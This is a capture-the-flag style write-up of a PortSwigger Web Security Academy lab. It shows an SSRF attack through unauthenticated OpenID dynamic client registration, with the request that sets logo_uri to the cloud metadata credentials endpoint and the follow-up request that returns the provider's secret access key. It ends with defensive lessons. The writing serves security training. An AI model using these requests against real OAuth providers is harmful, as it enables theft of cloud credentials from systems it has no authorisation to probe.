# OAuth Lab 2 — SSRF via OpenID dynamic client registration — PortSwigger

**Platform:** PortSwigger Web Security Academy (free lab)
**Topic:** OAuth 2.0 / OpenID Connect
**Lab:** SSRF via OpenID dynamic client registration
**Difficulty:** Practitioner
**Solved:** 27 November 2026 ~04:41 PKT (answer submitted via the lab's own `/submitSolution` endpoint, `{"correct":true}`, banner verified on the instance home page)
**Account:** Arbaz Ahmed Naveed

## Vulnerability Type

Server-side request forgery (SSRF) via unprotected OpenID dynamic client registration — the OAuth provider lets anyone register a client application without authentication, and the `logo_uri` supplied at registration is fetched by the provider server when the client's logo is requested, with no restriction on the target host.

## Solution

1. Found the OAuth provider host from the `/my-account` meta refresh (`oauth-<id>.oauth-server.net`).
2. Fetched the OpenID configuration to find the registration endpoint:
   ```
   GET https://oauth-<id>.oauth-server.net/.well-known/openid-configuration
   → "registration_endpoint": "https://oauth-<id>.oauth-server.net/reg"
   ```
3. Registered a client with a malicious `logo_uri` pointing at the cloud instance-metadata endpoint:
   ```json
   POST /reg
   {"redirect_uris": ["https://example.com"],
    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"}
   ```
   Response `201` with a new `client_id` (registration needs no authentication).
4. Triggered the fetch:
   ```
   GET https://oauth-<id>.oauth-server.net/client/<client_id>/logo
   ```
   The provider fetched the metadata URL and returned the OAuth provider's cloud credentials, including the `SecretAccessKey`.
5. Submitted that SecretAccessKey with `POST /submitSolution` (`answer=<key>`) — the response was `{"correct":true}` and the home page showed "Congratulations, you solved the lab!"

## Practical Explanation

- **Why it works:** OpenID Connect's dynamic client registration is meant to let applications self-register, but this provider implements it with no authentication and then fetches the `logo_uri` server-side when the logo is requested. The `logo_uri` is attacker-controlled, so it becomes an SSRF vector from the trusted provider server.
- **Why the metadata address works:** `169.254.169.254` is the cloud link-local metadata service, reachable only from inside the provider's cloud environment — exactly the kind of internal target SSRF is meant to reach.
- **The key detail:** the logo is only fetched when `/client/<id>/logo` is requested — registration alone does not trigger the SSRF; the second request is what makes the provider reach out to the metadata service.
- **Note on the submit step:** the lab's "Submit solution" button is a JavaScript `prompt()` that POSTs `answer=<value>` to `/submitSolution` and checks `correct` in the JSON reply — the same submission works directly with curl, so the answer does not need a browser.

## Lessons Learned

- Dynamic client registration must be authenticated or disabled; an open `/reg` endpoint hands out trusted client identities to anyone.
- Never fetch attacker-supplied URLs (`logo_uri`, `jwks_uri`, `sector_identifier_uri`) server-side without an allowlist and without blocking private/link-local ranges (including `169.254.169.254`).
- Cloud metadata credentials are high-value SSRF targets — block the metadata address at the egress/proxy layer for every internal service, not just the web app.
